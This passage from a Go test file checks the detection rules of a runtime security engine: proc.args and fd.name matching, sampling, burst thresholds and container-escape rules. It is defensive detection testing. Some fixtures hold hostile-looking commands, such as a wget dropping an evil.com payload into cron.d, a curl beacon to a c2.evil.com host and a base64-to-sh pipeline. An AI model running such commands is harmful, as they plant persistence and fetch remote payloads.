		require.Len(t, alerts, 1)
		assert.Equal(t, "fd_001", alerts[0].RuleID)
	})

	t.Run("write event with non-matching fd.name does not fire", func(t *testing.T) {
		event := types.Event{
			Type: types.EventFileAccess,
			File: &types.FileEvent{
				Op:     2, // FILE_OP_WRITE
				FDPath: "/tmp/harmless.txt",
			},
		}
		alerts := engine.Evaluate(event)
		assert.Empty(t, alerts)
	})

	t.Run("write event with empty fd.name does not fire", func(t *testing.T) {
		event := types.Event{
			Type: types.EventFileAccess,
			File: &types.FileEvent{
				Op:     2, // FILE_OP_WRITE
				FDPath: "",
			},
		}
		alerts := engine.Evaluate(event)
		assert.Empty(t, alerts)
	})

	t.Run("fd.name_truncated field returns correct value", func(t *testing.T) {
		truncRule := Rule{
			ID:        "fd_002",
			Name:      "Truncated path",
			EventType: types.EventFileAccess,
			Condition: RuleCondition{
				Field:  "fd.name_truncated",
				Op:     OpEquals,
				Values: []string{"true"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		}
		eng := NewRuleEngine([]Rule{truncRule})

		truncEvent := types.Event{
			Type: types.EventFileAccess,
			File: &types.FileEvent{
				Op:              1, // FILE_OP_READ
				FDPath:          "/very/long/path",
				FDPathTruncated: true,
			},
		}
		alerts := eng.Evaluate(truncEvent)
		require.Len(t, alerts, 1)

		noTruncEvent := types.Event{
			Type: types.EventFileAccess,
			File: &types.FileEvent{
				Op:              1,
				FDPath:          "/short/path",
				FDPathTruncated: false,
			},
		}
		alerts = eng.Evaluate(noTruncEvent)
		assert.Empty(t, alerts)
	})

	t.Run("open event uses fd.name same as filename", func(t *testing.T) {
		var fname [256]byte
		copy(fname[:], "/etc/passwd")
		event := types.Event{
			Type: types.EventFileAccess,
			File: &types.FileEvent{
				Op:       0, // FILE_OP_OPEN
				Filename: fname,
				FDPath:   "/etc/passwd",
			},
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
	})
}

// TestFDEnrichmentValidation verifies that fd.name and fd.name_truncated are
// accepted field names during rule validation for file and syscall event types.
func TestFDEnrichmentValidation(t *testing.T) {
	t.Run("fd.name valid for file events", func(t *testing.T) {
		rule := &Rule{
			ID:        "v_001",
			Name:      "test",
			EventType: types.EventFileAccess,
			Condition: RuleCondition{Field: "fd.name", Op: OpPrefix, Values: []string{"/etc/"}},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
		}
		err := validateRule(rule)
		require.NoError(t, err)
	})

	t.Run("fd.name_truncated valid for file events", func(t *testing.T) {
		rule := &Rule{
			ID:        "v_002",
			Name:      "test",
			EventType: types.EventFileAccess,
			Condition: RuleCondition{Field: "fd.name_truncated", Op: OpEquals, Values: []string{"true"}},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
		}
		err := validateRule(rule)
		require.NoError(t, err)
	})

	t.Run("fd.name valid for syscall events", func(t *testing.T) {
		rule := &Rule{
			ID:        "v_003",
			Name:      "test",
			EventType: types.EventSyscall,
			Condition: RuleCondition{Field: "fd.name", Op: OpPrefix, Values: []string{"/etc/"}},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
		}
		err := validateRule(rule)
		require.NoError(t, err)
	})
}

// TestProcArgsEnrichment verifies that proc.args and proc.args_truncated fields
// work correctly in rule conditions for syscall, file, and network event types.
func TestProcArgsEnrichment(t *testing.T) {
	t.Run("proc.args regex matches curl pastebin on syscall event", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_001",
			Name:      "Suspicious curl download",
			EventType: types.EventSyscall,
			Condition: RuleCondition{
				Field:  "proc.args",
				Op:     OpRegex,
				Values: []string{`curl.*pastebin\.com`},
			},
			Severity: types.SeverityCritical,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})
		event := types.Event{
			Type:     types.EventSyscall,
			ProcArgs: "curl https://pastebin.com/abc123",
			Syscall:  &types.SyscallEvent{Nr: 59},
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
		assert.Equal(t, "pa_001", alerts[0].RuleID)
	})

	t.Run("proc.args contains base64 on syscall event", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_002",
			Name:      "Base64 payload execution",
			EventType: types.EventSyscall,
			Condition: RuleCondition{
				Field:  "proc.args",
				Op:     OpContains,
				Values: []string{"base64"},
			},
			Severity: types.SeverityCritical,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})

		event := types.Event{
			Type:     types.EventSyscall,
			ProcArgs: "bash -c echo dGVzdA== | base64 -d | sh",
			Syscall:  &types.SyscallEvent{Nr: 59},
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1, "rule should fire when proc.args contains 'base64'")
		assert.Equal(t, "pa_002", alerts[0].RuleID)

		noMatchEvent := types.Event{
			Type:     types.EventSyscall,
			ProcArgs: "bash -c echo hello",
			Syscall:  &types.SyscallEvent{Nr: 59},
		}
		alerts = engine.Evaluate(noMatchEvent)
		assert.Empty(t, alerts, "rule should not fire when proc.args lacks 'base64'")
	})

	t.Run("proc.args empty does not fire", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_003",
			Name:      "Any base64 exec",
			EventType: types.EventSyscall,
			Condition: RuleCondition{
				Field:  "proc.args",
				Op:     OpContains,
				Values: []string{"base64"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})
		event := types.Event{
			Type:     types.EventSyscall,
			ProcArgs: "",
			Syscall:  &types.SyscallEvent{Nr: 59},
		}
		alerts := engine.Evaluate(event)
		assert.Empty(t, alerts)
	})

	t.Run("proc.args available for file access events", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_004",
			Name:      "wget writing to etc",
			EventType: types.EventFileAccess,
			Condition: RuleCondition{
				Field:  "proc.args",
				Op:     OpContains,
				Values: []string{"wget"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})
		event := types.Event{
			Type:     types.EventFileAccess,
			ProcArgs: "wget -O /etc/cron.d/evil http://evil.com/payload",
			File:     &types.FileEvent{Op: 2},
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
		assert.Equal(t, "pa_004", alerts[0].RuleID)
	})

	t.Run("proc.args available for network events", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_005",
			Name:      "curl beaconing",
			EventType: types.EventTCPConnect,
			Condition: RuleCondition{
				Field:  "proc.args",
				Op:     OpContains,
				Values: []string{"curl"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})
		event := types.Event{
			Type:     types.EventTCPConnect,
			ProcArgs: "curl http://c2.evil.com/beacon",
			Network:  &types.NetworkEvent{Dport: 80},
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
		assert.Equal(t, "pa_005", alerts[0].RuleID)
	})

	t.Run("proc.args_truncated field set correctly", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_006",
			Name:      "Detect truncated args",
			EventType: types.EventSyscall,
			Condition: RuleCondition{
				Field:  "proc.args_truncated",
				Op:     OpEquals,
				Values: []string{"true"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})

		truncEvent := types.Event{
			Type:              types.EventSyscall,
			ProcArgs:          "very long command that was truncated",
			ProcArgsTruncated: true,
			Syscall:           &types.SyscallEvent{Nr: 59},
		}
		alerts := engine.Evaluate(truncEvent)
		require.Len(t, alerts, 1)

		normalEvent := types.Event{
			Type:              types.EventSyscall,
			ProcArgs:          "short command",
			ProcArgsTruncated: false,
			Syscall:           &types.SyscallEvent{Nr: 59},
		}
		alerts = engine.Evaluate(normalEvent)
		assert.Empty(t, alerts)
	})

	t.Run("proc.args_truncated false by default on event with no args", func(t *testing.T) {
		rule := Rule{
			ID:        "pa_007",
			Name:      "Not truncated check",
			EventType: types.EventSyscall,
			Condition: RuleCondition{
				Field:  "proc.args_truncated",
				Op:     OpEquals,
				Values: []string{"false"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		}
		engine := NewRuleEngine([]Rule{rule})
		event := types.Event{
			Type:    types.EventSyscall,
			Syscall: &types.SyscallEvent{Nr: 1},
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
	})
}

// TestProcArgsValidation verifies that proc.args and proc.args_truncated are
// accepted as valid field names during rule validation for all supported event types.
func TestProcArgsValidation(t *testing.T) {
	for _, tt := range []struct {
		name      string
		eventType types.EventType
	}{
		{"syscall", types.EventSyscall},
		{"file", types.EventFileAccess},
		{"network", types.EventTCPConnect},
	} {
		t.Run(tt.name+"/proc.args accepted", func(t *testing.T) {
			rule := &Rule{
				ID:        "pav_001",
				Name:      "test",
				EventType: tt.eventType,
				Condition: RuleCondition{Field: "proc.args", Op: OpContains, Values: []string{"test"}},
				Severity:  types.SeverityWarning,
				Action:    ActionAlert,
			}
			assert.NoError(t, validateRule(rule))
		})
		t.Run(tt.name+"/proc.args_truncated accepted", func(t *testing.T) {
			rule := &Rule{
				ID:        "pav_002",
				Name:      "test",
				EventType: tt.eventType,
				Condition: RuleCondition{Field: "proc.args_truncated", Op: OpEquals, Values: []string{"true"}},
				Severity:  types.SeverityWarning,
				Action:    ActionAlert,
			}
			assert.NoError(t, validateRule(rule))
		})
	}
}

// TestContainsOperator verifies the OpContains substring-matching operator.
func TestContainsOperator(t *testing.T) {
	rule := Rule{
		ID:        "co_001",
		Name:      "Contains test",
		EventType: types.EventSyscall,
		Condition: RuleCondition{
			Field:  "proc.args",
			Op:     OpContains,
			Values: []string{"secret"},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}
	engine := NewRuleEngine([]Rule{rule})

	cases := []struct {
		args    string
		matches bool
	}{
		{"export SECRET_KEY=secret123", true},
		{"cat /etc/secretfile", true},
		{"ls -la", false},
		{"", false},
	}
	for _, tc := range cases {
		event := types.Event{
			Type:     types.EventSyscall,
			ProcArgs: tc.args,
			Syscall:  &types.SyscallEvent{Nr: 59},
		}
		alerts := engine.Evaluate(event)
		if tc.matches {
			assert.Len(t, alerts, 1, "expected match for args=%q", tc.args)
		} else {
			assert.Empty(t, alerts, "expected no match for args=%q", tc.args)
		}
	}
}

// TestSamplingRule verifies that per-rule sampling (sample_rate) reduces
// evaluations and that sample_rate: 1.0 has no effect on match behaviour.
func TestSamplingRule(t *testing.T) {
	baseRule := Rule{
		ID:        "sample_001",
		Name:      "Sampled rule",
		EventType: types.EventSyscall,
		Condition: RuleCondition{
			Field:  "nr",
			Op:     OpEquals,
			Values: []string{"59"},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}

	execEvent := func() types.Event {
		return types.Event{
			Type:    types.EventSyscall,
			Syscall: &types.SyscallEvent{Nr: 59},
		}
	}

	t.Run("sample_rate 1.0 evaluates every event", func(t *testing.T) {
		r := baseRule
		r.SampleRate = 1.0
		engine := NewRuleEngine([]Rule{r})
		matches := 0
		for i := 0; i < 1000; i++ {
			if len(engine.Evaluate(execEvent())) > 0 {
				matches++
			}
		}
		assert.Equal(t, 1000, matches, "sample_rate 1.0 must evaluate every event")
	})

	t.Run("sample_rate missing (0) treated as 1.0 via validateRule", func(t *testing.T) {
		r := baseRule
		r.SampleRate = 0
		require.NoError(t, validateRule(&r))
		assert.Equal(t, 1.0, r.SampleRate, "zero should be normalised to 1.0")
	})

	t.Run("sample_rate 0.1 evaluates ~10% of events", func(t *testing.T) {
		r := baseRule
		r.SampleRate = 0.1
		engine := NewRuleEngine([]Rule{r})
		matches := 0
		const n = 10000
		for i := 0; i < n; i++ {
			if len(engine.Evaluate(execEvent())) > 0 {
				matches++
			}
		}
		// Allow ±5% tolerance around the 10% target.
		assert.InDelta(t, 0.10, float64(matches)/n, 0.05,
			"sample_rate 0.1 should evaluate ~10%% of events (got %.2f%%)", float64(matches)/n*100)
	})

	t.Run("sample_rate out of range is rejected", func(t *testing.T) {
		r := baseRule
		r.SampleRate = 1.5
		assert.Error(t, validateRule(&r), "sample_rate > 1.0 must be rejected")

		r.SampleRate = -0.1
		assert.Error(t, validateRule(&r), "negative sample_rate must be rejected")
	})

	t.Run("sample_rate 0.5 validates without error", func(t *testing.T) {
		r := baseRule
		r.SampleRate = 0.5
		assert.NoError(t, validateRule(&r))
	})
}

// TestDeterministicSampling verifies that sample_deterministic: true gives
// stable, reproducible results for the same PID within a 1s time window.
func TestDeterministicSampling(t *testing.T) {
	const rate = 0.3

	t.Run("same pid+ts always gives same result", func(t *testing.T) {
		pid := uint32(12345)
		ts := uint64(1_700_000_000_000_000_000) // arbitrary nanosecond timestamp
		result1 := shouldSample(pid, ts, rate, true)
		result2 := shouldSample(pid, ts, rate, true)
		assert.Equal(t, result1, result2, "deterministic sampling must be idempotent")
	})

	t.Run("result is stable within 1s window", func(t *testing.T) {
		pid := uint32(99999)
		base := uint64(1_700_000_000_000_000_000)
		// timestamps within the same ~1.07s bucket (<<30 same value)
		results := make([]bool, 10)
		for i := range results {
			results[i] = shouldSample(pid, base+uint64(i)*100_000_000, rate, true) // +100ms each
		}
		for i := 1; i < len(results); i++ {
			assert.Equal(t, results[0], results[i],
				"deterministic result must be stable within 1s window (index %d)", i)
		}
	})

	t.Run("different pids give varied results", func(t *testing.T) {
		ts := uint64(1_700_000_000_000_000_000)
		trueCount := 0
		for pid := uint32(1); pid <= 1000; pid++ {
			if shouldSample(pid, ts, rate, true) {
				trueCount++
			}
		}
		// With rate=0.3, expect roughly 30% ±15%
		assert.InDelta(t, 300, trueCount, 150,
			"deterministic sampling across 1000 PIDs should be ~30%%")
	})

	t.Run("different time buckets give different results for same pid", func(t *testing.T) {
		pid := uint32(42)
		// Two timestamps in different ~1s buckets
		ts1 := uint64(0)
		ts2 := uint64(1) << 31 // 2 buckets ahead
		// They may or may not differ — just check the function doesn't panic
		_ = shouldSample(pid, ts1, rate, true)
		_ = shouldSample(pid, ts2, rate, true)
	})
}

// TestSamplingValidation verifies rule validation rejects invalid sample_rate values.
func TestSamplingValidation(t *testing.T) {
	validRule := func(rate float64, det bool) *Rule {
		return &Rule{
			ID:                  "sv_001",
			Name:                "test",
			EventType:           types.EventSyscall,
			Condition:           RuleCondition{Field: "nr", Op: OpEquals, Values: []string{"1"}},
			Severity:            types.SeverityWarning,
			Action:              ActionAlert,
			SampleRate:          rate,
			SampleDeterministic: det,
		}
	}

	cases := []struct {
		rate    float64
		wantErr bool
	}{
		{0.0, false}, // normalised to 1.0
		{0.1, false},
		{0.5, false},
		{1.0, false},
		{-0.01, true},
		{1.01, true},
		{2.0, true},
	}
	for _, tc := range cases {
		err := validateRule(validRule(tc.rate, false))
		if tc.wantErr {
			assert.Error(t, err, "rate %.2f should fail validation", tc.rate)
		} else {
			assert.NoError(t, err, "rate %.2f should pass validation", tc.rate)
		}
	}

	// sample_deterministic is a boolean, no range to validate
	assert.NoError(t, validateRule(validRule(0.5, true)))
}

// TestThresholdRule verifies the 5.8g count/burst operator: a rule with
// Threshold set only alerts once its base condition has matched Count times
// for the same PID within WindowSeconds.
func TestThresholdRule(t *testing.T) {
	baseRule := Rule{
		ID:        "burst_001",
		Name:      "Burst rule",
		EventType: types.EventNetClose,
		Condition: RuleCondition{
			Field:  "duration_ms",
			Op:     OpLessThan,
			Values: []string{"100"},
		},
		Threshold: &RuleThreshold{Count: 3, WindowSeconds: 10},
		Severity:  types.SeverityWarning,
		Action:    ActionAlert,
	}

	// unique PID per subtest so globalBurstTracker state doesn't leak across cases.
	nextPID := uint32(900000)
	pidFor := func() uint32 {
		nextPID++
		return nextPID
	}

	evt := func(pid uint32, ts time.Time) types.Event {
		return types.Event{
			Type:      types.EventNetClose,
			PID:       pid,
			Timestamp: uint64(ts.UnixNano()),
			NetClose:  &types.NetworkCloseEvent{Duration: 10 * time.Millisecond},
		}
	}

	t.Run("first two matches within window are suppressed", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{baseRule})
		pid := pidFor()
		base := time.Unix(1_700_000_000, 0)
		assert.Empty(t, engine.Evaluate(evt(pid, base)), "1st match must be suppressed")
		assert.Empty(t, engine.Evaluate(evt(pid, base.Add(time.Second))), "2nd match must be suppressed")
	})

	t.Run("third match within window fires, and so does every match after", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{baseRule})
		pid := pidFor()
		base := time.Unix(1_700_100_000, 0)
		engine.Evaluate(evt(pid, base))
		engine.Evaluate(evt(pid, base.Add(time.Second)))
		alerts := engine.Evaluate(evt(pid, base.Add(2*time.Second)))
		require.Len(t, alerts, 1, "3rd match must fire (reached threshold)")
		alerts = engine.Evaluate(evt(pid, base.Add(3*time.Second)))
		require.Len(t, alerts, 1, "match after threshold is reached must keep firing")
	})

	t.Run("matches outside the window reset the count", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{baseRule})
		pid := pidFor()
		base := time.Unix(1_700_200_000, 0)
		engine.Evaluate(evt(pid, base))
		engine.Evaluate(evt(pid, base.Add(time.Second)))
		// 3rd match arrives well outside the 10s window from the 1st match,
		// so only the last 2 (this one plus the 2nd) are within window.
		alerts := engine.Evaluate(evt(pid, base.Add(30*time.Second)))
		assert.Empty(t, alerts, "match after the window expired must not immediately fire")
	})

	t.Run("different PIDs are tracked independently", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{baseRule})
		pidA, pidB := pidFor(), pidFor()
		base := time.Unix(1_700_300_000, 0)
		engine.Evaluate(evt(pidA, base))
		engine.Evaluate(evt(pidA, base.Add(time.Second)))
		// pidB's 1st match must not benefit from pidA's count.
		alerts := engine.Evaluate(evt(pidB, base.Add(2*time.Second)))
		assert.Empty(t, alerts, "a different PID must start its own count from zero")
	})

	t.Run("nil threshold alerts on every match (unchanged behavior)", func(t *testing.T) {
		r := baseRule
		r.Threshold = nil
		engine := NewRuleEngine([]Rule{r})
		pid := pidFor()
		alerts := engine.Evaluate(evt(pid, time.Unix(1_700_400_000, 0)))
		assert.Len(t, alerts, 1, "no threshold configured must alert immediately")
	})
}

func TestThresholdValidation(t *testing.T) {
	validRule := func(count, windowSeconds int) *Rule {
		return &Rule{
			ID:        "tv_001",
			Name:      "test",
			EventType: types.EventNetClose,
			Condition: RuleCondition{Field: "duration_ms", Op: OpLessThan, Values: []string{"100"}},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
			Threshold: &RuleThreshold{Count: count, WindowSeconds: windowSeconds},
		}
	}

	cases := []struct {
		name          string
		count, window int
		wantErr       bool
	}{
		{"count 1 rejected (equivalent to no threshold)", 1, 10, true},
		{"count 0 rejected", 0, 10, true},
		{"negative window rejected", 5, -1, true},
		{"zero window rejected", 5, 0, true},
		{"count 2, window 1 accepted", 2, 1, false},
		{"count 5, window 60 accepted", 5, 60, false},
	}
	for _, tc := range cases {
		err := validateRule(validRule(tc.count, tc.window))
		if tc.wantErr {
			assert.Error(t, err, tc.name)
		} else {
			assert.NoError(t, err, tc.name)
		}
	}

	// group_by (5.8g): an unrecognised mode must be rejected rather than
	// silently falling back to PID grouping, and the empty default must be
	// normalised so nothing downstream has to special-case "".
	groupCases := []struct {
		name    string
		groupBy string
		wantErr bool
		want    string
	}{
		{"empty group_by defaults to pid", "", false, ThresholdGroupPID},
		{"explicit pid accepted", ThresholdGroupPID, false, ThresholdGroupPID},
		{"chain accepted", ThresholdGroupChain, false, ThresholdGroupChain},
		{"typo rejected, not silently treated as pid", "chan", true, ""},
		{"lineage rejected", "lineage", true, ""},
	}
	for _, tc := range groupCases {
		r := validRule(5, 10)
		r.Threshold.GroupBy = tc.groupBy
		err := validateRule(r)
		if tc.wantErr {
			assert.Error(t, err, tc.name)
			continue
		}
		require.NoError(t, err, tc.name)
		assert.Equal(t, tc.want, r.Threshold.GroupBy, tc.name)
	}
}

// TestThresholdRule_ChainGrouping covers the shape group_by: pid cannot see at
// all (5.8g): a parent spawning a fresh short-lived child per probe, where no
// single PID ever matches twice and a PID-grouped threshold therefore never
// fires no matter how large the burst.
func TestThresholdRule_ChainGrouping(t *testing.T) {
	rule := Rule{
		ID:        "burst_chain_001",
		Name:      "burst chain test",
		EventType: types.EventNetClose,
		Condition: RuleCondition{Field: "duration_ms", Op: OpLessThan, Values: []string{"100"}},
		Threshold: &RuleThreshold{Count: 3, WindowSeconds: 10, GroupBy: ThresholdGroupChain},
		Severity:  types.SeverityWarning,
		Action:    ActionAlert,
	}

	base := time.Unix(1_700_100_000, 0)
	evt := func(pid uint32, ts time.Time) types.Event {
		return types.Event{
			Type:      types.EventNetClose,
			PID:       pid,
			Timestamp: uint64(ts.UnixNano()),
			NetClose:  &types.NetworkCloseEvent{Duration: 10 * time.Millisecond},
		}
	}

	t.Run("children of one chain share a counter", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{rule})
		// PIDs 910001..910004 all resolve to the same chain; 910009 to another.
		engine.SetChainGroupResolver(func(pid uint32) (uint64, bool) {
			if pid >= 910001 && pid <= 910004 {
				return 0xAAAA, true
			}
			return 0xBBBB, true
		})

		assert.Empty(t, engine.Evaluate(evt(910001, base)), "1st child of the chain: below threshold")
		assert.Empty(t, engine.Evaluate(evt(910002, base.Add(time.Second))), "2nd child: below threshold")
		assert.Len(t, engine.Evaluate(evt(910003, base.Add(2*time.Second))), 1, "3rd child reaches Count for the chain")
		assert.Len(t, engine.Evaluate(evt(910004, base.Add(3*time.Second))), 1, "burst keeps firing while the chain stays hot")

		// A different chain is unaffected — one match is still one match.
		assert.Empty(t, engine.Evaluate(evt(910009, base.Add(4*time.Second))), "unrelated chain must not inherit the burst")
	})

	t.Run("same events under pid grouping never fire", func(t *testing.T) {
		pidRule := rule
		pidRule.ID = "burst_chain_002"
		pidRule.Threshold = &RuleThreshold{Count: 3, WindowSeconds: 10, GroupBy: ThresholdGroupPID}
		engine := NewRuleEngine([]Rule{pidRule})
		engine.SetChainGroupResolver(func(uint32) (uint64, bool) { return 0xAAAA, true })

		for i, pid := range []uint32{920001, 920002, 920003, 920004} {
			assert.Empty(t, engine.Evaluate(evt(pid, base.Add(time.Duration(i)*time.Second))),
				"one match per PID never reaches Count under pid grouping")
		}
	})

	t.Run("unknown chain isolates the PID instead of merging", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{rule})
		engine.SetChainGroupResolver(func(uint32) (uint64, bool) { return 0, false })

		// Three distinct PIDs with no known chain must NOT be pooled together.
		for i, pid := range []uint32{930001, 930002, 930003} {
			assert.Empty(t, engine.Evaluate(evt(pid, base.Add(time.Duration(i)*time.Second))),
				"unresolved chains must fall back to per-PID isolation, not a shared bucket")
		}
		// The same PID repeating does reach the threshold.
		assert.Empty(t, engine.Evaluate(evt(930001, base.Add(4*time.Second))))
		assert.Len(t, engine.Evaluate(evt(930001, base.Add(5*time.Second))), 1)
	})

	t.Run("no resolver installed degrades to pid grouping", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{rule})
		pid := uint32(940001)
		assert.Empty(t, engine.Evaluate(evt(pid, base)))
		assert.Empty(t, engine.Evaluate(evt(pid, base.Add(time.Second))))
		assert.Len(t, engine.Evaluate(evt(pid, base.Add(2*time.Second))), 1)
	})
}

// TestContainerPodEnrichmentFields is the regression guard for wave 6.0f
// (№200): container.id/k8s.pod (aliases for container_id/pod_name) must
// read Event.Enrichment, and an event with no Enrichment at all must read
// as "empty" rather than being rejected as an unknown field.
func TestContainerPodEnrichmentFields(t *testing.T) {
	fileEvent := func(enrichment *types.EnrichmentInfo) types.Event {
		var filename [256]byte
		copy(filename[:], "/dev/vda1")
		return types.Event{
			Type:       types.EventFileAccess,
			File:       &types.FileEvent{Filename: filename, Op: 1},
			Enrichment: enrichment,
		}
	}

	containerRule := Rule{
		ID:        "cid_001",
		Name:      "container.id non-empty",
		EventType: types.EventFileAccess,
		Condition: RuleCondition{
			Field:  "container.id",
			Op:     OpNotEquals,
			Values: []string{""},
		},
		Severity: types.SeverityCritical,
		Action:   ActionAlert,
	}
	podRule := Rule{
		ID:        "pod_001",
		Name:      "k8s.pod empty",
		EventType: types.EventFileAccess,
		Condition: RuleCondition{
			Field:  "k8s.pod",
			Op:     OpEquals,
			Values: []string{""},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}

	t.Run("container.id matches a populated ContainerID", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{containerRule})
		alerts := engine.Evaluate(fileEvent(&types.EnrichmentInfo{ContainerID: "abc123"}))
		require.Len(t, alerts, 1)
		assert.Equal(t, "cid_001", alerts[0].RuleID)
	})

	t.Run("container.id does not match an empty ContainerID", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{containerRule})
		assert.Empty(t, engine.Evaluate(fileEvent(&types.EnrichmentInfo{})))
	})

	t.Run("container.id does not match a nil Enrichment", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{containerRule})
		assert.Empty(t, engine.Evaluate(fileEvent(nil)))
	})

	t.Run("k8s.pod empty matches a nil Enrichment (host case)", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{podRule})
		alerts := engine.Evaluate(fileEvent(nil))
		require.Len(t, alerts, 1)
		assert.Equal(t, "pod_001", alerts[0].RuleID)
	})

	t.Run("k8s.pod empty does not match a populated PodName", func(t *testing.T) {
		engine := NewRuleEngine([]Rule{podRule})
		assert.Empty(t, engine.Evaluate(fileEvent(&types.EnrichmentInfo{PodName: "web-1"})))
	})
}

// TestWave60fShippedRuleSplit200 is the offline half of controls 6.0.13/6.0.14
// (wave 6.0f, №200) and the ONLY check that the critical, container-scoped
// path of container_escape_host_device fires at all.
//
// Why it exists as a Go test and not only as a pipeline step: the 6.0
// measurement stand is a bare host with no k8s and no container-runtime
// enrichment, so container.id/pod_name are empty there for every event that
// can ever reach the engine. The critical branch of the split rule is
// therefore physically unreachable on that stand — the pipeline's 6.0.13
// asserts only that it stays silent, which a rule that can never match also
// satisfies. Without this test the split (№200) would be indistinguishable
// from having quietly turned the critical rule mute, which the wave's
// acceptance clause 4 explicitly forbids ("a FP silenced by making the rule
// mute is a loss of detection, not a fix").
//
// The four fixtures mirror the four live controls:
//   - dumpe2fs open on the host   -> 6.0.13: no critical from either rule
//   - dd write on the host        -> 6.0.14: impact rule fires (critical)
//   - open from inside a container-> the control the stand cannot run
//   - mkfs.ext4 write             -> the prefix subgroup of the impact rule
func TestWave60fShippedRuleSplit200(t *testing.T) {
	escapeRules, err := LoadRulesFromFile("../../rules/container-escape.yaml")
	require.NoError(t, err, "rules/container-escape.yaml must load")
	impactRules, err := LoadRulesFromFile("../../rules/impact-gaps.yaml")
	require.NoError(t, err, "rules/impact-gaps.yaml must load")

	pick := func(rules []Rule, ids ...string) []Rule {
		var out []Rule
		for _, want := range ids {
			found := false
			for _, r := range rules {
				if r.ID == want {
					out = append(out, r)
					found = true
					break
				}
			}
			require.True(t, found, "rule %s must exist in the shipped rule files (wave 6.0f, №200)", want)
		}
		return out
	}

	engine := NewRuleEngine(pick(append(append([]Rule{}, escapeRules...), impactRules...),
		"container_escape_host_device",
		"container_escape_host_device_from_host",
		"impact_raw_disk_write_from_container",
	))

	const (
		opOpen  = 0
		opWrite = 2
	)
	event := func(comm, path string, op uint8, enrichment *types.EnrichmentInfo) types.Event {
		var filename [256]byte
		copy(filename[:], path)
		e := types.Event{
			Type:       types.EventFileAccess,
			File:       &types.FileEvent{Filename: filename, Op: op},
			Enrichment: enrichment,
		}
		copy(e.Comm[:], comm)
		return e
	}
	ids := func(alerts []types.Alert) map[string]types.Severity {
		got := make(map[string]types.Severity, len(alerts))
		for _, a := range alerts {
			got[a.RuleID] = a.Severity
		}
		return got
	}

	t.Run("6.0.13 offline: host dumpe2fs raises no critical", func(t *testing.T) {
		got := ids(engine.Evaluate(event("dumpe2fs", "/dev/vda1", opOpen, nil)))
		assert.NotContains(t, got, "container_escape_host_device",
			"host dumpe2fs must not reach the container-scoped critical rule after the №200 split")
		assert.NotContains(t, got, "impact_raw_disk_write_from_container",
			"dumpe2fs opens the device, it does not write it — op=open must no longer match after the №200 narrowing")
		assert.Equal(t, types.SeverityWarning, got["container_escape_host_device_from_host"],
			"the host case must still be reported, at warning severity — silencing it entirely would be a loss of detection")
	})

	t.Run("op=write narrowing: dd merely OPENING the device raises nothing", func(t *testing.T) {
		// The comm predicate alone does not pin the №200 narrowing: dumpe2fs
		// above is excluded by comm whatever the op is. This fixture is the
		// one that fails if file.op widens back to [write, open].
		got := ids(engine.Evaluate(event("dd", "/dev/vda1", opOpen, nil)))
		assert.NotContains(t, got, "impact_raw_disk_write_from_container",
			"opening a block device is not a raw disk write — file.op must stay eq write (№200)")
	})

	t.Run("6.0.14 offline: host dd write raises the impact critical", func(t *testing.T) {
		got := ids(engine.Evaluate(event("dd", "/dev/vda1", opWrite, nil)))
		assert.Equal(t, types.SeverityCritical, got["impact_raw_disk_write_from_container"],
			"the №200 narrowing must keep the dd case — this is the pipeline's 6.0.14")
	})

	t.Run("mkfs prefix subgroup still matches", func(t *testing.T) {
		got := ids(engine.Evaluate(event("mkfs.ext4", "/dev/vda1", opWrite, nil)))
		assert.Equal(t, types.SeverityCritical, got["impact_raw_disk_write_from_container"],
			"the mkfs* case is a prefix predicate, not an 'in' value — the engine's 'in' operator compares strings exactly")
	})

	t.Run("container case reaches the critical rule (unreachable on the bare stand)", func(t *testing.T) {
		got := ids(engine.Evaluate(event("dumpe2fs", "/dev/vda1", opOpen,
			&types.EnrichmentInfo{ContainerID: "3f2b8c1d9e00"})))
		assert.Equal(t, types.SeverityCritical, got["container_escape_host_device"],
			"the same event that is benign on the host is the escape signal from inside a container — this branch has no live control on the 6.0 stand")
		assert.NotContains(t, got, "container_escape_host_device_from_host",
			"the host rule must not double-report the container case")
	})

	t.Run("pod enrichment alone also reaches the critical rule", func(t *testing.T) {
